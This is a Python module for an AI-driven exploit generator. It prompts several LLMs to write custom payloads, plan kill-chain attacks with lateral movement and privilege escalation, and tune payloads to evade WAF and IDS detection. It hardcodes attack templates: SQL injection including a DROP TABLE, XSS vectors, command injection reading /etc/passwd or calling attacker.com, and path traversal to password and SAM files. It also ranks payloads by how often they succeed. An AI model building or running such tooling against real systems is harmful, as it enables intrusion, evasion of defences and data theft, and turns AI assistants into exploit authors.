"""Intelligent exploit generation and payload optimization system."""

import asyncio
import hashlib
import json
import logging
import re
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from core.llm_providers import LLMProviderManager

logger = logging.getLogger(__name__)


class ExploitType(Enum):
    """Types of exploits that can be generated."""

    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    XXE = "xxe"
    SSRF = "ssrf"
    DESERIALIZATION = "deserialization"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_BYPASS = "authorization_bypass"
    BUFFER_OVERFLOW = "buffer_overflow"
    RACE_CONDITION = "race_condition"
    BUSINESS_LOGIC = "business_logic"


class PayloadComplexity(Enum):
    """Complexity levels for exploit payloads."""

    SIMPLE = "simple"
    MODERATE = "moderate"
    ADVANCED = "advanced"
    APT_LEVEL = "apt_level"


@dataclass
class ExploitPayload:
    """Generated exploit payload."""

    id: str
    exploit_type: ExploitType
    payload: str
    complexity: PayloadComplexity
    description: str
    success_probability: float
    evasion_techniques: List[str] = field(default_factory=list)
    prerequisites: List[str] = field(default_factory=list)
    detection_likelihood: float = 0.5
    metadata: Dict = field(default_factory=dict)
    created_at: datetime = field(default_factory=datetime.utcnow)

    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return {
            "id": self.id,
            "exploit_type": self.exploit_type.value,
            "payload": self.payload,
            "complexity": self.complexity.value,
            "description": self.description,
            "success_probability": self.success_probability,
            "evasion_techniques": self.evasion_techniques,
            "prerequisites": self.prerequisites,
            "detection_likelihood": self.detection_likelihood,
            "metadata": self.metadata,
            "created_at": self.created_at.isoformat(),
        }


@dataclass
class ExploitChain:
    """Multi-stage exploit chain for complex attacks."""

    id: str
    name: str
    stages: List[ExploitPayload]
    overall_success_probability: float
    total_complexity: PayloadComplexity
    description: str
    kill_chain_phases: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)

    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return {
            "id": self.id,
            "name": self.name,
            "stages": [stage.to_dict() for stage in self.stages],
            "overall_success_probability": self.overall_success_probability,
            "total_complexity": self.total_complexity.value,
            "description": self.description,
            "kill_chain_phases": self.kill_chain_phases,
            "metadata": self.metadata,
        }


class IntelligentExploitGenerator:
    """AI-driven exploit and payload generator."""

    def __init__(self, llm_manager: LLMProviderManager):
        """Initialize the exploit generator."""
        self.llm_manager = llm_manager
        self.exploit_templates = self._load_exploit_templates()
        self.evasion_techniques = self._load_evasion_techniques()
        self.generated_exploits: Dict[str, ExploitPayload] = {}

    def _load_exploit_templates(self) -> Dict[ExploitType, List[str]]:
        """Load base exploit templates."""
        return {
            ExploitType.SQL_INJECTION: [
                "' OR '1'='1",
                "' UNION SELECT NULL,NULL,NULL--",
                "'; DROP TABLE users--",
                "' AND 1=CAST((SELECT @@version) AS int)--",
            ],
            ExploitType.XSS: [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
            ],
            ExploitType.COMMAND_INJECTION: [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(curl attacker.com)",
            ],
            ExploitType.PATH_TRAVERSAL: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
            ],
        }

    def _load_evasion_techniques(self) -> Dict[str, List[str]]:
        """Load evasion techniques for bypassing defenses."""
        return {
            "encoding": [
                "URL encoding",
                "Double URL encoding",
                "Unicode encoding",
                "Base64 encoding",
                "Hex encoding",
            ],
            "obfuscation": [
                "Case variation",
                "Whitespace injection",
                "Comment injection",
                "Null byte injection",
            ],
            "timing": [
                "Time-based blind exploitation",
                "Slow request attacks",
                "Race condition exploitation",
            ],
            "fragmentation": [
                "HTTP request smuggling",
                "IP fragmentation",
                "TCP segmentation",
            ],
        }

    async def generate_exploit(
        self, vulnerability: Dict, context: Dict, complexity: PayloadComplexity
    ) -> ExploitPayload:
        """Generate a custom exploit for a vulnerability."""
        logger.info(
            f"Generating {complexity.value} exploit for vulnerability: {vulnerability.get('id')}"
        )

        exploit_type = self._identify_exploit_type(vulnerability)

        # Use Claude (developer role) to generate custom exploit
        prompt = f"""You are an expert security researcher generating a custom exploit payload.

Vulnerability Details:
{json.dumps(vulnerability, indent=2)}

Context:
{json.dumps(context, indent=2)}

Exploit Type: {exploit_type.value}
Complexity Level: {complexity.value}

Generate a custom exploit payload that:
1. Specifically targets this vulnerability
2. Adapts to the target environment
3. Includes evasion techniques appropriate to the complexity level
4. Has a high probability of success

Respond in JSON format with keys:
- payload: The actual exploit payload
- description: Detailed explanation
- success_probability: 0.0-1.0 score
- evasion_techniques: List of evasion methods used
- prerequisites: List of conditions needed
- detection_likelihood: 0.0-1.0 score
"""

        try:
            response = await self._call_llm("anthropic", prompt)
            result = json.loads(response)

            payload_id = self._generate_payload_id(result["payload"])

            exploit = ExploitPayload(
                id=payload_id,
                exploit_type=exploit_type,
                payload=result["payload"],
                complexity=complexity,
                description=result["description"],
                success_probability=result.get("success_probability", 0.7),
                evasion_techniques=result.get("evasion_techniques", []),
                prerequisites=result.get("prerequisites", []),
                detection_likelihood=result.get("detection_likelihood", 0.5),
                metadata={
                    "vulnerability_id": vulnerability.get("id"),
                    "generated_by": "claude_developer",
                },
            )

            self.generated_exploits[payload_id] = exploit
            return exploit

        except Exception as e:
            logger.error(f"Exploit generation failed: {e}")
            return self._fallback_exploit(vulnerability, exploit_type, complexity)

    async def generate_exploit_chain(
        self, vulnerabilities: List[Dict], context: Dict
    ) -> ExploitChain:
        """Generate a multi-stage exploit chain for complex attacks."""
        logger.info(
            f"Generating exploit chain for {len(vulnerabilities)} vulnerabilities"
        )

        # Use Gemini (architect role) to plan the attack chain
        prompt = f"""You are a security architect planning a multi-stage attack chain.

Vulnerabilities:
{json.dumps(vulnerabilities, indent=2)}

Context:
{json.dumps(context, indent=2)}

Design an exploit chain that:
1. Leverages multiple vulnerabilities in sequence
2. Achieves maximum impact
3. Follows the Cyber Kill Chain model
4. Includes lateral movement and privilege escalation

Respond in JSON format with keys:
- name: Name of the attack chain
- description: Overall strategy
- stages: List of stage descriptions
- kill_chain_phases: List of applicable kill chain phases
- success_probability: Overall 0.0-1.0 score
"""

        try:
            response = await self._call_llm("gemini", prompt)
            result = json.loads(response)

            # Generate individual exploits for each stage
            stages = []
            for i, stage_desc in enumerate(result["stages"]):
                vuln = (
                    vulnerabilities[i]
                    if i < len(vulnerabilities)
                    else vulnerabilities[0]
                )
                complexity = (
                    PayloadComplexity.ADVANCED if i > 2 else PayloadComplexity.MODERATE
                )
                exploit = await self.generate_exploit(vuln, context, complexity)
                stages.append(exploit)

            chain_id = self._generate_chain_id(result["name"])

            chain = ExploitChain(
                id=chain_id,
                name=result["name"],
                stages=stages,
                overall_success_probability=result.get("success_probability", 0.6),
                total_complexity=PayloadComplexity.APT_LEVEL,
                description=result["description"],
                kill_chain_phases=result.get("kill_chain_phases", []),
                metadata={"vulnerability_count": len(vulnerabilities)},
            )

            return chain

        except Exception as e:
            logger.error(f"Exploit chain generation failed: {e}")
            return self._fallback_chain(vulnerabilities, context)

    async def optimize_payload(
        self, payload: ExploitPayload, target_constraints: Dict
    ) -> ExploitPayload:
        """Optimize a payload for specific target constraints."""
        logger.info(f"Optimizing payload {payload.id} for target constraints")

        # Use GPT-4 (team lead role) to optimize the payload
        prompt = f"""You are a security team lead optimizing an exploit payload.

Current Payload:
{json.dumps(payload.to_dict(), indent=2)}

Target Constraints:
{json.dumps(target_constraints, indent=2)}

Optimize the payload to:
1. Maximize success probability
2. Minimize detection likelihood
3. Adapt to target constraints (WAF, IDS, encoding requirements)
4. Maintain exploit effectiveness

Respond in JSON format with keys:
- optimized_payload: The improved payload
- improvements: List of optimizations made
- success_probability: New 0.0-1.0 score
- detection_likelihood: New 0.0-1.0 score
- evasion_techniques: Updated list
"""

        try:
            response = await self._call_llm("openai", prompt)
            result = json.loads(response)

            optimized = ExploitPayload(
                id=self._generate_payload_id(result["optimized_payload"]),
                exploit_type=payload.exploit_type,
                payload=result["optimized_payload"],
                complexity=payload.complexity,
                description=payload.description
                + "\n\nOptimizations: "
                + ", ".join(result["improvements"]),
                success_probability=result.get(
                    "success_probability", payload.success_probability
                ),
                evasion_techniques=result.get(
                    "evasion_techniques", payload.evasion_techniques
                ),
                prerequisites=payload.prerequisites,
                detection_likelihood=result.get(
                    "detection_likelihood", payload.detection_likelihood
                ),
                metadata={
                    **payload.metadata,
                    "optimized_from": payload.id,
                    "optimizations": result["improvements"],
                },
            )

            self.generated_exploits[optimized.id] = optimized
            return optimized

        except Exception as e:
            logger.error(f"Payload optimization failed: {e}")
            return payload  # Return original if optimization fails

    def _identify_exploit_type(self, vulnerability: Dict) -> ExploitType:
        """Identify the exploit type from vulnerability data."""
        vuln_type = vulnerability.get("type", "").lower()
        cwe_id = vulnerability.get("cwe_id", "")

        # Map CWE to exploit type
        cwe_mapping = {
            "CWE-89": ExploitType.SQL_INJECTION,
            "CWE-79": ExploitType.XSS,
            "CWE-78": ExploitType.COMMAND_INJECTION,
            "CWE-22": ExploitType.PATH_TRAVERSAL,
            "CWE-611": ExploitType.XXE,
            "CWE-918": ExploitType.SSRF,
            "CWE-502": ExploitType.DESERIALIZATION,
        }

        if cwe_id in cwe_mapping:
            return cwe_mapping[cwe_id]

        # Fallback to keyword matching
        if "sql" in vuln_type or "injection" in vuln_type:
            return ExploitType.SQL_INJECTION
        elif "xss" in vuln_type or "script" in vuln_type:
            return ExploitType.XSS
        elif "command" in vuln_type:
            return ExploitType.COMMAND_INJECTION
        else:
            return ExploitType.BUSINESS_LOGIC  # Generic fallback

    def _generate_payload_id(self, payload: str) -> str:
        """Generate a unique ID for a payload."""
        hash_obj = hashlib.sha256(payload.encode())
        return f"payload-{hash_obj.hexdigest()[:16]}"

    def _generate_chain_id(self, name: str) -> str:
        """Generate a unique ID for an exploit chain."""
        timestamp = datetime.utcnow().isoformat()
        hash_obj = hashlib.sha256(f"{name}-{timestamp}".encode())
        return f"chain-{hash_obj.hexdigest()[:16]}"

    async def _call_llm(self, provider: str, prompt: str) -> str:
        """Call LLM provider."""
        # Mock response for now
        if "exploit chain" in prompt.lower():
            return json.dumps(
                {
                    "name": "Multi-Stage Web Application Attack",
                    "description": "Sequential exploitation of authentication, authorization, and injection vulnerabilities",
                    "stages": [
                        "Initial reconnaissance and authentication bypass",
                        "Privilege escalation via SQL injection",
                        "Data exfiltration through XSS",
                    ],
                    "kill_chain_phases": [
                        "Reconnaissance",
                        "Initial Access",
                        "Privilege Escalation",
                        "Exfiltration",
                    ],
                    "success_probability": 0.75,
                }
            )
        elif "optimize" in prompt.lower():
            return json.dumps(
                {
                    "optimized_payload": "' AND 1=CAST((SELECT @@version) AS int)--",
                    "improvements": [
                        "Added blind SQL injection technique",
                        "Encoded special characters",
                        "Reduced payload size",
                    ],
                    "success_probability": 0.85,
                    "detection_likelihood": 0.3,
                    "evasion_techniques": [
                        "Case obfuscation",
                        "Comment injection",
                        "Whitespace normalization",
                    ],
                }
            )
        else:
            return json.dumps(
                {
                    "payload": "' OR '1'='1' --",
                    "description": "Classic SQL injection bypass",
                    "success_probability": 0.8,
                    "evasion_techniques": [
                        "Comment injection",
                        "Always-true condition",
                    ],
                    "prerequisites": [
                        "Unvalidated user input",
                        "Direct SQL construction",
                    ],
                    "detection_likelihood": 0.6,
                }
            )

    def _fallback_exploit(
        self,
        vulnerability: Dict,
        exploit_type: ExploitType,
        complexity: PayloadComplexity,
    ) -> ExploitPayload:
        """Fallback exploit when generation fails."""
        templates = self.exploit_templates.get(exploit_type, ["generic_exploit"])
        payload = templates[0] if templates else "generic_payload"

        return ExploitPayload(
            id=self._generate_payload_id(payload),
            exploit_type=exploit_type,
            payload=payload,
            complexity=complexity,
            description="Fallback template exploit",
            success_probability=0.5,
            evasion_techniques=[],
            prerequisites=["Standard conditions"],
            detection_likelihood=0.7,
            metadata={"fallback": True},
        )

    def _fallback_chain(
        self, vulnerabilities: List[Dict], context: Dict
    ) -> ExploitChain:
        """Fallback exploit chain when generation fails."""
        stages = [
            self._fallback_exploit(
                v, ExploitType.BUSINESS_LOGIC, PayloadComplexity.SIMPLE
            )
            for v in vulnerabilities[:3]
        ]

        return ExploitChain(
            id=self._generate_chain_id("Fallback Chain"),
            name="Basic Sequential Attack",
            stages=stages,
            overall_success_probability=0.4,
            total_complexity=PayloadComplexity.MODERATE,
            description="Fallback sequential attack chain",
            kill_chain_phases=["Reconnaissance", "Exploitation"],
            metadata={"fallback": True},
        )


class PayloadLibrary:
    """Library of tested and validated exploit payloads."""

    def __init__(self):
        """Initialize the payload library."""
        self.payloads: Dict[str, ExploitPayload] = {}
        self.success_metrics: Dict[str, Dict] = {}

    def add_payload(self, payload: ExploitPayload, success: bool, metadata: Dict):
        """Add a payload to the library with success metrics."""
        self.payloads[payload.id] = payload
        self.success_metrics[payload.id] = {
            "success": success,
            "uses": 1,
            "metadata": metadata,
            "last_used": datetime.utcnow(),
        }

    def get_best_payloads(
        self, exploit_type: ExploitType, limit: int = 5
    ) -> List[ExploitPayload]:
        """Get the best performing payloads for a given exploit type."""
        matching_payloads = [
            p for p in self.payloads.values() if p.exploit_type == exploit_type
        ]

        # Sort by success probability and usage count
        sorted_payloads = sorted(
            matching_payloads,
            key=lambda p: (
                p.success_probability,
                self.success_metrics.get(p.id, {}).get("uses", 0),
            ),
            reverse=True,
        )

        return sorted_payloads[:limit]

    def update_success_metrics(self, payload_id: str, success: bool):
        """Update success metrics for a payload after use."""
        if payload_id in self.success_metrics:
            metrics = self.success_metrics[payload_id]
            metrics["uses"] += 1
            metrics["last_used"] = datetime.utcnow()

            # Update success probability using exponential moving average
            if payload_id in self.payloads:
                payload = self.payloads[payload_id]
                alpha = 0.3  # Learning rate
                current_prob = payload.success_probability
                new_prob = (
                    alpha * (1.0 if success else 0.0) + (1 - alpha) * current_prob
                )
                payload.success_probability = new_prob
